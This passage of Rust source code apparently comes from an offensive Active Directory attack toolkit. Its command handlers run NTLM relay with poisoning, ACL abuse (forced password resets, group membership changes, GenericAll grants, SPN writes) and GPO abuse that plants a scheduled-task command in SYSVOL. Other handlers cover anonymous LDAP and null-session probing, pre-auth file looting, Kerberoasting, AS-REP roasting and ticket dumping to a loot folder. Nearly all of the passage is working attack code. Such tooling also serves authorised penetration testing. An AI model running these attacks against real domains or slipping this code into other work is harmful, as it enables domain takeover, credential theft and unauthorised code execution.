                    })
                })
                .collect();

            let config = RelayControllerConfig {
                interface: "0.0.0.0".to_string(),
                llmnr: true,
                nbtns: true,
                mdns: false,
                mitm6: false,
                responder: true,
                relay_targets,
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
                no_poison,
            };

            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        banner::print_success("HTTP relay started");
                        if let Some(cmd) = command {
                            println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
                        }
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("HTTP relay failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::SmbRelay {
            targets,
            port: _,
            command,
        } => {
            println!(
                "{} Starting SMB relay to {} targets",
                "🎯".bright_black(),
                targets.join(", ").cyan()
            );
            if let Some(cmd) = command {
                println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
            }
            banner::print_success("SMB relay configured");
            0
        }
        NtlmAction::HttpRelay {
            targets,
            port: _,
            command,
        } => {
            println!(
                "{} Starting HTTP relay to {} targets",
                "🎯".bright_black(),
                targets.join(", ").cyan()
            );
            if let Some(cmd) = command {
                println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
            }
            banner::print_success("HTTP relay configured");
            0
        }
    }
}

// ──────────────────────────────────────────────────────────
// ACL Abuse Handler
// ──────────────────────────────────────────────────────────

async fn cmd_acl(cli: &Cli, action: AclAction) -> i32 {
    use overthrone_core::proto::ldap::LdapSession;

    banner::print_module_banner("ACL ABUSE");

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    let mut ldap = match LdapSession::connect(
        &dc,
        cli.domain.as_deref().unwrap_or(""),
        &creds.username,
        creds.password().unwrap_or(""),
        false,
    )
    .await
    {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&format!("LDAP connect failed: {}", e));
            return 1;
        }
    };

    let result = match action {
        AclAction::ForcePassword { target, password } => {
            println!(
                "{} Force-changing password for {} ...",
                "[*]".bright_black(),
                target.cyan()
            );
            ldap.force_change_password(&target, &password).await
        }
        AclAction::AddMember { group, member } => {
            println!(
                "{} Adding {} to group {} ...",
                "[*]".bright_black(),
                member.cyan(),
                group.yellow()
            );
            ldap.add_member_to_group(&group, &member).await
        }
        AclAction::RemoveMember { group, member } => {
            println!(
                "{} Removing {} from group {} ...",
                "[*]".bright_black(),
                member.cyan(),
                group.yellow()
            );
            ldap.remove_member_from_group(&group, &member).await
        }
        AclAction::WriteDacl { target, trustee } => {
            println!(
                "{} Granting GenericAll to '{}' on '{}' ...",
                "[*]".bright_black(),
                trustee.cyan(),
                target.yellow()
            );
            // Resolve trustee to binary SID
            let sid_bytes = match ldap.resolve_object_sid_binary(&trustee).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("Failed to resolve SID for '{}': {}", trustee, e));
                    return 1;
                }
            };
            ldap.write_dacl_grant_generic_all(&target, &sid_bytes).await
        }
        AclAction::WriteSpn { target, spn } => {
            println!(
                "{} Writing SPN '{}' on '{}' ...",
                "[*]".bright_black(),
                spn.cyan(),
                target.yellow()
            );
            ldap.write_spn(&target, &spn).await
        }
        AclAction::RemoveSpn { target, spn } => {
            println!(
                "{} Removing SPN '{}' from '{}' ...",
                "[*]".bright_black(),
                spn.cyan(),
                target.yellow()
            );
            ldap.remove_spn(&target, &spn).await
        }
        AclAction::Enum { sid } => {
            let trustee_sid = sid.unwrap_or_else(|| {
                println!(
                    "{} No SID specified, scanning all objects (may be slow)",
                    "[!]".yellow()
                );
                "*".to_string()
            });
            println!(
                "{} Enumerating abusable ACEs for SID: {}",
                "[*]".bright_black(),
                trustee_sid.cyan()
            );
            match ldap.find_abusable_acls(&trustee_sid).await {
                Ok(dacls) => {
                    if dacls.is_empty() {
                        println!("{} No abusable ACEs found", "[-]".yellow());
                    } else {
                        banner::print_success(&format!(
                            "Found {} objects with abusable ACLs",
                            dacls.len()
                        ));
                        for dacl in &dacls {
                            println!("  {} {}", "[+]".green(), dacl.object_dn.cyan());
                            for ace in &dacl.aces {
                                println!(
                                    "      {} {}  mask=0x{:08X}  type={:?}",
                                    "ACE".yellow(),
                                    ace.trustee_sid,
                                    ace.access_mask,
                                    ace.ace_type
                                );
                            }
                        }
                    }
                    return 0;
                }
                Err(e) => {
                    banner::print_fail(&format!("ACL enum failed: {}", e));
                    return 1;
                }
            }
        }
    };

    match result {
        Ok(_) => {
            banner::print_success("ACL operation completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("ACL operation failed: {}", e));
            1
        }
    }
}

// ──────────────────────────────────────────────────────────
// GPO Abuse Handler
// ──────────────────────────────────────────────────────────

async fn cmd_gpo(cli: &Cli, action: GpoAction) -> i32 {
    use overthrone_core::proto::ldap::LdapSession;

    banner::print_module_banner("GPO ABUSE");

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match action {
        GpoAction::Enum => {
            let mut ldap = match LdapSession::connect(
                &dc,
                cli.domain.as_deref().unwrap_or(""),
                &creds.username,
                creds.password().unwrap_or(""),
                false,
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("LDAP connect failed: {}", e));
                    return 1;
                }
            };
            match ldap.enumerate_gpos().await {
                Ok(gpos) => {
                    banner::print_success(&format!("Found {} GPOs", gpos.len()));
                    for g in &gpos {
                        println!(
                            "  {} {} ({}) → {}",
                            "[+]".green(),
                            g.display_name.cyan(),
                            g.cn.bright_black(),
                            g.gpc_file_sys_path.yellow()
                        );
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("GPO enum failed: {}", e));
                    1
                }
            }
        }
        GpoAction::Write {
            gpo,
            sysvol,
            command,
            task_name,
            user_policy,
        } => {
            use overthrone_core::proto::gpo_write;
            use overthrone_core::proto::smb::SmbSession;

            let target_dc = dc.clone();
            println!(
                "{} Writing ImmediateTask '{}' to GPO '{}' on SYSVOL ...",
                "[*]".bright_black(),
                task_name.cyan(),
                gpo.yellow()
            );
            println!("    Command: {}", command.bright_red());

            let smb = match SmbSession::connect(
                &target_dc,
                cli.domain.as_deref().unwrap_or(""),
                &creds.username,
                creds.password().unwrap_or(""),
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect failed: {}", e));
                    return 1;
                }
            };

            // Resolve the SYSVOL share path (strip \\host\SYSVOL prefix)
            let share = "SYSVOL";
            let policy_subdir = if user_policy { "User" } else { "Machine" };
            let task_xml_path = format!(
                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
                sysvol.trim_end_matches('\\'),
                gpo,
                policy_subdir
            );
            // Extract just the path relative to SYSVOL share root
            let rel_path = task_xml_path
                .trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
                .trim_start_matches('\\')
                .to_string();

            let xml = gpo_write::build_immediate_task_xml(&task_name, &command);

            match smb.write_file(share, &rel_path, xml.as_bytes()).await {
                Ok(_) => {
                    banner::print_success(&format!(
                        "ImmediateTask XML written to {}\\{}",
                        share, rel_path
                    ));
                    println!(
                        "    {} Waiting for Group Policy refresh (90s default) ...",
                        "[!]".yellow()
                    );
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("SYSVOL write failed: {}", e));
                    1
                }
            }
        }
        GpoAction::Cleanup {
            gpo,
            sysvol,
            task_name,
            user_policy,
        } => {
            use overthrone_core::proto::smb::SmbSession;

            let target_dc = dc.clone();
            println!(
                "{} Removing ImmediateTask '{}' from GPO '{}' ...",
                "[*]".bright_black(),
                task_name.cyan(),
                gpo.yellow()
            );

            let smb = match SmbSession::connect(
                &target_dc,
                cli.domain.as_deref().unwrap_or(""),
                &creds.username,
                creds.password().unwrap_or(""),
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect failed: {}", e));
                    return 1;
                }
            };

            let share = "SYSVOL";
            let policy_subdir = if user_policy { "User" } else { "Machine" };
            let rel_path = format!(
                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
                sysvol
                    .trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
                    .trim_start_matches('\\'),
                gpo,
                policy_subdir
            );

            match smb.delete_file(share, &rel_path).await {
                Ok(_) => {
                    banner::print_success("ImmediateTask XML removed from SYSVOL");
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("SYSVOL cleanup failed: {}", e));
                    1
                }
            }
        }
    }
}

// cmd_enum
async fn cmd_enum(
    cli: &Cli,
    target: EnumTarget,
    _filter: Option<String>,
    _include_disabled: bool,
) -> i32 {
    banner::print_module_banner("ENUMERATION");
    if matches!(
        target,
        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession
    ) {
        return cmd_pre_enum(cli, target).await;
    }

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let modules = enum_target_modules(&target);
    let config = match make_reaper_config(cli, creds, dc, modules, 500) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match target {
        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession => unreachable!(),
        EnumTarget::Users => println!("{}", "Enumerating users...".bright_black()),
        EnumTarget::Computers => println!("{}", "Enumerating computers...".bright_black()),
        EnumTarget::Groups => println!("{}", "Enumerating groups...".bright_black()),
        EnumTarget::Trusts => println!("{}", "Enumerating trusts...".bright_black()),
        EnumTarget::Spns => println!("{}", "Enumerating SPNs...".bright_black()),
        EnumTarget::Asrep => println!(
            "{}",
            "Enumerating AS-REP roastable accounts...".bright_black()
        ),
        EnumTarget::Delegations => println!("{}", "Enumerating delegations...".bright_black()),
        EnumTarget::Gpos => println!("{}", "Enumerating GPOs...".bright_black()),
        EnumTarget::Laps => println!("{}", "Enumerating LAPS-readable secrets...".bright_black()),
        EnumTarget::Policy => {
            println!("{}", "Enumerating password/domain policy...".bright_black())
        }
        EnumTarget::All => println!("{}", "Enumerating all objects...".bright_black()),
    }

    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(_) => {
            banner::print_success("Enumeration completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Enumeration failed: {}", e));
            1
        }
    }
}

async fn cmd_pre_enum(cli: &Cli, target: EnumTarget) -> i32 {
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match target {
        EnumTarget::Pre => {
            println!(
                "{}",
                "Running no-credential AD service triage...".bright_black()
            );
            let mut ldap_open = false;
            let mut ldaps_open = false;
            let mut smb_open = false;
            match overthrone_core::scan::quick_scan(&dc).await {
                Ok(mut results) => {
                    results.sort_by_key(|result| result.port);
                    for result in &results {
                        let status = if result.open {
                            ldap_open |= result.port == 389;
                            ldaps_open |= result.port == 636;
                            smb_open |= result.port == 445;
                            "open".green()
                        } else {
                            "closed".bright_black()
                        };
                        println!(
                            "  {} {:>5}/tcp {:<7} {}",
                            "▸".bright_black(),
                            result.port,
                            status,
                            ad_port_label(result.port)
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Pre-enum port triage failed: {}", e));
                    return 1;
                }
            }

            if ldap_open {
                let _ = anonymous_ldap_probe(&dc).await;
            } else {
                banner::print_info("LDAP/389 is not open; skipping anonymous RootDSE probe.");
            }

            if ldaps_open {
                let _ = anonymous_ldaps_probe(&dc).await;
            } else {
                banner::print_info("LDAPS/636 is not open; skipping anonymous LDAPS probe.");
            }

            if smb_open {
                let _ = smb_null_probe(&dc).await;
            } else {
                banner::print_info("SMB/445 is not open; skipping null-session SMB probe.");
            }

            if overthrone_core::proto::rid::tooling_available() {
                banner::print_info("RID tooling check: rpcclient/net-rpc path is available.");
            } else {
                banner::print_warn(
                    "RID tooling check: rpcclient/net-rpc not found. Install samba-common-bin (Kali/Linux).",
                );
            }

            banner::print_success("Pre-enum triage completed");
            0
        }
        EnumTarget::Anonymous => match anonymous_ldap_probe(&dc).await {
            Ok(_) => 0,
            Err(e) => {
                banner::print_fail(&format!("Anonymous LDAP probe failed: {}", e));
                1
            }
        },
        EnumTarget::NullSession => {
            banner::print_info(
                "Attempting null-session RID cycling with default RID range 500-1100.",
            );
            commands_impl::cmd_rid(cli, 500, 1100, true).await
        }
        _ => unreachable!(),
    }
}

async fn anonymous_ldap_probe(dc: &str) -> std::result::Result<bool, String> {
    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};

    let url = format!("ldap://{}:389", dc);
    let settings = LdapConnSettings::new().set_conn_timeout(std::time::Duration::from_secs(5));
    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url)
        .await
        .map_err(|e| format!("connect to {url} failed: {e}"))?;
    drive!(conn);

    let bind = ldap
        .simple_bind("", "")
        .await
        .map_err(|e| format!("anonymous bind request failed: {e}"))?;
    if bind.rc != 0 {
        banner::print_info(&format!(
            "Anonymous LDAP bind rejected by {} (rc={} {}).",
            dc,
            bind.rc,
            ldap_result_label(bind.rc)
        ));
        let _ = ldap.unbind().await;
        return Ok(false);
    }

    banner::print_success(&format!("Anonymous LDAP bind allowed on {}", dc));
    let attrs = vec![
        "defaultNamingContext",
        "configurationNamingContext",
        "rootDomainNamingContext",
        "dnsHostName",
        "ldapServiceName",
        "domainFunctionality",
        "forestFunctionality",
        "domainControllerFunctionality",
        "supportedLDAPVersion",
        "supportedSASLMechanisms",
    ];
    let (entries, _) = ldap
        .search("", Scope::Base, "(objectClass=*)", attrs)
        .await
        .map_err(|e| format!("RootDSE search failed: {e}"))?
        .success()
        .map_err(|e| format!("RootDSE search rejected: {e}"))?;

    for entry in entries {
        let entry = SearchEntry::construct(entry);
        println!("  {}", "RootDSE".bright_black());
        for attr in [
            "defaultNamingContext",
            "configurationNamingContext",
            "rootDomainNamingContext",
            "dnsHostName",
            "ldapServiceName",
            "domainFunctionality",
            "forestFunctionality",
            "domainControllerFunctionality",
            "supportedLDAPVersion",
            "supportedSASLMechanisms",
        ] {
            if let Some(values) = entry.attrs.get(attr) {
                println!("    {:<35} {}", attr, values.join(", "));
            }
        }
    }

    let _ = ldap.unbind().await;
    Ok(true)
}

async fn anonymous_ldaps_probe(dc: &str) -> std::result::Result<bool, String> {
    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};

    let url = format!("ldaps://{}:636", dc);
    let settings = LdapConnSettings::new()
        .set_conn_timeout(std::time::Duration::from_secs(5))
        .set_no_tls_verify(true);
    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url)
        .await
        .map_err(|e| format!("connect to {url} failed: {e}"))?;
    drive!(conn);

    let bind = ldap
        .simple_bind("", "")
        .await
        .map_err(|e| format!("anonymous LDAPS bind request failed: {e}"))?;
    if bind.rc != 0 {
        banner::print_info(&format!(
            "Anonymous LDAPS bind rejected by {} (rc={} {}).",
            dc,
            bind.rc,
            ldap_result_label(bind.rc)
        ));
        let _ = ldap.unbind().await;
        return Ok(false);
    }

    banner::print_success(&format!("Anonymous LDAPS bind allowed on {}", dc));
    let attrs = vec![
        "defaultNamingContext",
        "configurationNamingContext",
        "rootDomainNamingContext",
        "dnsHostName",
        "ldapServiceName",
        "supportedLDAPVersion",
    ];
    let (entries, _) = ldap
        .search("", Scope::Base, "(objectClass=*)", attrs)
        .await
        .map_err(|e| format!("LDAPS RootDSE search failed: {e}"))?
        .success()
        .map_err(|e| format!("LDAPS RootDSE search rejected: {e}"))?;

    for entry in entries {
        let entry = SearchEntry::construct(entry);
        println!("  {}", "RootDSE over LDAPS".bright_black());
        for attr in [
            "defaultNamingContext",
            "configurationNamingContext",
            "rootDomainNamingContext",
            "dnsHostName",
            "ldapServiceName",
            "supportedLDAPVersion",
        ] {
            if let Some(values) = entry.attrs.get(attr) {
                println!("    {:<35} {}", attr, values.join(", "));
            }
        }
    }

    let _ = ldap.unbind().await;
    Ok(true)
}

async fn smb_null_probe(dc: &str) -> std::result::Result<bool, String> {
    let session = overthrone_core::proto::smb::SmbSession::connect(dc, "", "", "")
        .await
        .map_err(|e| format!("SMB null session connect failed: {e}"))?;

    let checks = session
        .check_share_access(&["IPC$", "NETLOGON", "SYSVOL", "C$", "ADMIN$"])
        .await;

    let readable: Vec<String> = checks
        .iter()
        .filter(|r| r.readable)
        .map(|r| r.share_name.clone())
        .collect();

    banner::print_success(&format!(
        "SMB null session allowed on {} (readable shares: {})",
        dc,
        if readable.is_empty() {
            "none".to_string()
        } else {
            readable.join(", ")
        }
    ));
    Ok(!readable.is_empty())
}

async fn discover_domain_from_rootdse(dc: &str) -> Option<String> {
    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};

    let url = format!("ldap://{}:389", dc);
    let settings = LdapConnSettings::new().set_conn_timeout(std::time::Duration::from_secs(4));
    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url).await.ok()?;
    drive!(conn);

    let bind = ldap.simple_bind("", "").await.ok()?;
    if bind.rc != 0 {
        let _ = ldap.unbind().await;
        return None;
    }

    let (entries, _) = ldap
        .search(
            "",
            Scope::Base,
            "(objectClass=*)",
            vec!["defaultNamingContext"],
        )
        .await
        .ok()?
        .success()
        .ok()?;

    let domain = entries.into_iter().find_map(|entry| {
        let se = SearchEntry::construct(entry);
        se.attrs
            .get("defaultNamingContext")
            .and_then(|values| values.first())
            .map(|dn| {
                dn.split(',')
                    .filter_map(|part| part.trim().strip_prefix("DC="))
                    .collect::<Vec<_>>()
                    .join(".")
            })
            .filter(|domain| !domain.is_empty())
    });

    let _ = ldap.unbind().await;
    domain
}

async fn run_preauth_snaffler(dc: &str, domain: &str) {
    banner::print_module_banner("PREAUTH LOOT");
    let normalized_domain = domain.trim().to_string();
    if normalized_domain.is_empty() {
        banner::print_warn(
            "Domain is unknown; running anonymous Snaffler bootstrap with empty domain context.",
        );
    }

    let config = ReaperConfig {
        dc_ip: dc.to_string(),
        domain: normalized_domain.clone(),
        base_dn: if normalized_domain.is_empty() {
            String::new()
        } else {
            ReaperConfig::base_dn_from_domain(&normalized_domain)
        },
        username: String::new(),
        password: Some(String::new()),
        nt_hash: None,
        modules: vec!["snaffler".to_string()],
        page_size: 500,
        use_ldaps: false,
    };

    match overthrone_reaper::snaffler::run_snaffler(&config).await {
        Ok(findings) => {
            if findings.is_empty() {
                banner::print_info("Pre-auth loot pass found no interesting files.");
            } else {
                banner::print_success(&format!(
                    "Pre-auth loot pass found {} interesting files",
                    findings.len()
                ));
                let loot_dir = std::path::PathBuf::from("./loot");
                let _ = std::fs::create_dir_all(&loot_dir);
                let summary_path = loot_dir.join("preauth_snaffler_findings.json");
                if let Ok(json) = serde_json::to_string_pretty(&findings) {
                    let _ = std::fs::write(&summary_path, json);
                    banner::print_info(&format!(
                        "Pre-auth findings saved to {}",
                        summary_path.display()
                    ));
                }
            }
        }
        Err(e) => {
            banner::print_warn(&format!(
                "Pre-auth loot pass failed (continuing autopwn): {}",
                e
            ));
        }
    }
}

fn ad_port_label(port: u16) -> &'static str {
    match port {
        88 => "Kerberos",
        135 => "RPC endpoint mapper",
        139 => "NetBIOS session service",
        389 => "LDAP",
        445 => "SMB",
        464 => "Kerberos password change",
        636 => "LDAPS",
        3268 => "Global Catalog LDAP",
        3269 => "Global Catalog LDAPS",
        3389 => "RDP",
        5985 => "WinRM HTTP",
        5986 => "WinRM HTTPS",
        9389 => "AD Web Services",
        _ => "unknown",
    }
}

fn ldap_result_label(rc: u32) -> &'static str {
    match rc {
        0 => "success",
        1 => "operationsError",
        2 => "protocolError",
        3 => "timeLimitExceeded",
        4 => "sizeLimitExceeded",
        8 => "strongAuthRequired",
        32 => "noSuchObject",
        49 => "invalidCredentials",
        50 => "insufficientAccessRights",
        53 => "unwillingToPerform",
        _ => "see LDAP result code",
    }
}

fn enum_target_modules(target: &EnumTarget) -> Vec<String> {
    let modules: &[&str] = match target {
        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession => &[],
        EnumTarget::Users => &["users"],
        EnumTarget::Computers => &["computers"],
        EnumTarget::Groups => &["groups"],
        EnumTarget::Trusts => &["trusts"],
        EnumTarget::Spns => &["spns"],
        EnumTarget::Asrep => &["users"],
        EnumTarget::Delegations => &["delegations"],
        EnumTarget::Gpos => &["gpos"],
        EnumTarget::Laps => &["laps"],
        EnumTarget::Policy => &["policy"],
        EnumTarget::All => &[],
    };

    modules.iter().map(|module| (*module).to_string()).collect()
}

// cmd_kerberos
async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
    banner::print_module_banner("KERBEROS");

    // UserEnum is a zero-knowledge operation — no credentials needed
    if let KerberosAction::UserEnum {
        ref userlist,
        ref output,
        delay,
        concurrency,
        use_ldap,
    } = action
    {
        let dc = match require_dc(cli) {
            Ok(d) => d,
            Err(e) => return e,
        };
        let domain = match cli.domain.as_deref() {
            Some(d) => d,
            None => {
                banner::print_fail("--domain is required");
                return 1;
            }
        };

        let uc = overthrone_hunter::UserEnumConfig {
            userlist: userlist
                .as_ref()
                .map(std::path::PathBuf::from)
                .unwrap_or_default(),
            output_file: output.as_ref().map(std::path::PathBuf::from),
            save_asrep_hashes: true,
            concurrency,
            use_ldap,
        };

        return match overthrone_hunter::userenum::run(&dc, domain, &uc, delay).await {
            Ok(result) => {
                let total = result.valid_users.len() + result.no_preauth_users.len();
                if total > 0 {
                    banner::print_success(&format!(
                        "{} valid user(s) discovered ({} with AS-REP hash)",
                        total,
                        result.no_preauth_users.len()
                    ));
                    0
                } else {
                    banner::print_fail("No valid users found");
                    1
                }
            }
            Err(e) => {
                banner::print_fail(&format!("User enumeration failed: {}", e));
                1
            }
        };
    }

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    match action {
        KerberosAction::Roast { spn } => {
            use overthrone_core::proto::kerberos;
            // Step 1: Get a TGT
            let tgt =
                match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
                    .await
                {
                    Ok(t) => t,
                    Err(e) => {
                        banner::print_fail(&format!("TGT request failed: {}", e));
                        return 1;
                    }
                };
            println!(
                "{} TGT obtained for {}@{}",
                "✓".green(),
                creds.username.cyan(),
                creds.domain.cyan()
            );

            let spns: Vec<String> = if let Some(target_spn) = spn {
                vec![target_spn]
            } else {
                // Enumerate SPNs via LDAP
                println!("{}", "  Enumerating SPNs via LDAP...".bright_black());
                let hunt_config = overthrone_hunter::HuntConfig {
                    dc_ip: dc.clone(),
                    domain: creds.domain.clone(),
                    username: creds.username.clone(),
                    secret: secret.clone(),
                    use_hash,
                    base_dn: None,
                    use_ldaps: false,
                    output_dir: std::path::PathBuf::from("./loot"),
                    concurrency: 10,
                    timeout: 30,
                    jitter_ms: 0,
                    tgt: None,
                };
                match overthrone_hunter::kerberoast::run(
                    &hunt_config,
                    &overthrone_hunter::kerberoast::KerberoastConfig::default(),
                )
                .await
                {
                    Ok(result) => {
                        println!(
                            "{} Kerberoast complete: {} hashes captured",
                            "✓".green(),
                            result.hashes.len()
                        );
                        return 0;
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Kerberoast failed: {}", e));
                        return 1;
                    }
                }
            };

            // Roast specific SPN
            let mut success = false;
            let loot_dir = std::path::PathBuf::from("./loot");
            let _ = std::fs::create_dir_all(&loot_dir);
            for target_spn in &spns {
                match kerberos::kerberoast(&dc, &tgt, target_spn).await {
                    Ok(hash) => {
                        println!(
                            "{} Hash: {}",
                            "✓".green(),
                            &hash.hash_string[..80.min(hash.hash_string.len())]
                        );
                        // Write hash to file
                        let hash_file = loot_dir.join("kerberoast_hashes.txt");
                        if let Ok(mut f) = std::fs::OpenOptions::new()
                            .create(true)
                            .append(true)
                            .open(&hash_file)
                        {
                            use std::io::Write;
                            let _ = writeln!(f, "{}", hash.hash_string);
                        }
                        success = true;
                    }
                    Err(e) => {
                        println!("{} {}: {}", "✗".red(), target_spn, e);
                    }
                }
            }
            if success {
                banner::print_success("Kerberoast hashes written to ./loot/kerberoast_hashes.txt");
            } else {
                banner::print_fail("No hashes obtained");
                return 1;
            }
        }
        KerberosAction::AsrepRoast { userlist } => {
            use overthrone_core::proto::kerberos;
            let loot_dir = std::path::PathBuf::from("./loot");
            let _ = std::fs::create_dir_all(&loot_dir);
            let output_path = loot_dir.join("asrep_hashes.txt");

            let roast_users = |users: Vec<String>| {
                let dc = dc.clone();
                let domain = creds.domain.clone();
                let output_path = output_path.clone();
                async move {
                    if users.is_empty() {
                        banner::print_fail("No usernames provided for AS-REP roasting");
                        return 1;
                    }

                    let mut hash_count = 0;
                    for user in &users {
                        match kerberos::asrep_roast(&dc, &domain, user).await {
                            Ok(hash) => {
                                println!("{} AS-REP hash: {}", "✓".green(), user.cyan());
                                if let Ok(mut f) = std::fs::OpenOptions::new()
                                    .create(true)
                                    .append(true)
                                    .open(&output_path)
                                {
                                    use std::io::Write;
                                    let _ = writeln!(f, "{}", hash.hash_string);
                                }
                                hash_count += 1;
                            }
                            Err(e) => {
                                println!("{} {}: {}", "✗".dimmed(), user, e);
                            }
                        }
                    }

                    if hash_count > 0 {
                        banner::print_success(&format!(
                            "{} AS-REP hashes written to {}",
                            hash_count,
                            output_path.display()
                        ));
                        0
                    } else {
                        banner::print_fail("No AS-REP roastable accounts found");
                        1
                    }
                }
            };

            if let Some(path) = userlist {
                let users: Vec<String> = match std::fs::read_to_string(&path) {
                    Ok(content) => content
                        .lines()
                        .map(|line| line.trim().to_string())
                        .filter(|line| !line.is_empty())
                        .collect(),
                    Err(e) => {
                        banner::print_warn(&format!(
                            "Cannot read userlist {}: {}. Falling back to embedded list.",
                            path, e
                        ));
                        overthrone_hunter::userenum::embedded_usernames()
                    }
                };

                return roast_users(users).await;
            }

            // No userlist provided — try LDAP enumeration first, then fall back.
            let hunt_config = overthrone_hunter::HuntConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                username: creds.username.clone(),
                secret: secret.clone(),
                use_hash,
                base_dn: None,
                use_ldaps: false,
                output_dir: loot_dir.clone(),
                concurrency: 10,
                timeout: 30,
                jitter_ms: 0,
                tgt: None,
            };
            let ac = overthrone_hunter::asreproast::AsRepRoastConfig {
                output_file: Some(output_path.clone()),
                ..Default::default()
            };

            match overthrone_hunter::asreproast::run(&hunt_config, &ac).await {
                Ok(result) => {
                    if result.hashes.is_empty() {
                        banner::print_fail("No AS-REP roastable accounts found");
                        return 1;
                    }
                    banner::print_success(&format!(
                        "{} AS-REP hashes written to {}",
                        result.hashes.len(),
                        output_path.display()
                    ));
                    return 0;
                }
                Err(e) => {
                    banner::print_warn(&format!(
                        "LDAP enumeration failed: {}. Falling back to embedded list.",
                        e
                    ));
                }
            }

            let users = overthrone_hunter::userenum::embedded_usernames();
            return roast_users(users).await;
        }
        KerberosAction::GetTgt => {
            use overthrone_core::proto::kerberos;
            match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
                .await
            {
                Ok(tgt) => {
                    println!(
                        "{} TGT for {}@{} (expires: {:?})",
                        "✓".green(),
                        tgt.client_principal.cyan(),
                        tgt.client_realm.cyan(),
                        tgt.end_time
                    );
                    // Save ticket to ./loot/
                    let loot_dir = std::path::PathBuf::from("./loot");
                    let _ = std::fs::create_dir_all(&loot_dir);
                    let kirbi_path = loot_dir.join(format!("{}_tgt.kirbi", creds.username));
                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
                        use kerberos_asn1::Asn1Object;
                        use std::io::Write;
                        let _ = f.write_all(&tgt.ticket.build());
                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
                    }
                    banner::print_success("TGT obtained");
                }
                Err(e) => {
                    banner::print_fail(&format!("TGT request failed: {}", e));
                    return 1;
                }
            }
        }
        KerberosAction::GetTgs { spn } => {
            use overthrone_core::proto::kerberos;
            // Get TGT first
            let tgt =
                match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
                    .await
                {
                    Ok(t) => t,
                    Err(e) => {
                        banner::print_fail(&format!("TGT request failed: {}", e));
                        return 1;
                    }
                };
            // Request service ticket
            match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
                Ok(st) => {
                    println!("{} Service ticket for {} obtained", "✓".green(), spn.cyan());
                    let loot_dir = std::path::PathBuf::from("./loot");
                    let _ = std::fs::create_dir_all(&loot_dir);
                    let safe_spn = spn.replace('/', "_");
                    let kirbi_path = loot_dir.join(format!("{}_tgs.kirbi", safe_spn));
                    if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
                        use kerberos_asn1::Asn1Object;
                        use std::io::Write;
                        let _ = f.write_all(&st.ticket.build());
                        println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
                    }
                    banner::print_success("TGS obtained");
                }
                Err(e) => {
                    banner::print_fail(&format!("TGS request failed: {}", e));
                    return 1;
                }
            }
        }
        KerberosAction::UserEnum { .. } => {
            // Handled above before credential check (zero-knowledge, no creds needed)
            unreachable!()
        }
    }
    0
}

// cmd_smb
async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
    banner::print_module_banner("SMB");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(s) => s,
        Err(e) => {
